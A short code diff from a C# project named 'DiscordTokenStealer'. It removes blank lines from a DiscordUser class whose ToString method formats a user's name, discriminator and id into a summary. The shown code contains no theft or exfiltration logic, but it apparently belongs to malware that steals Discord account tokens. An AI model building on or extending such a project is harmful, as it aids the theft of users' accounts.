@@ -2,7 +2,6 @@
 using System.Text.Json.Serialization;
 
 namespace DiscordTokenStealer.Discord;
-
 public class DiscordUser
 {
     private const string Empty = "None";
@@ -45,7 +44,6 @@ public class DiscordUser
 
     public override string ToString()
     {
-        
         return new StringBuilder()
                 .AppendLine($"\tSummary:")
                 .AppendLine($"\t\tUser: {Username}#{Discriminator} ({Id})")
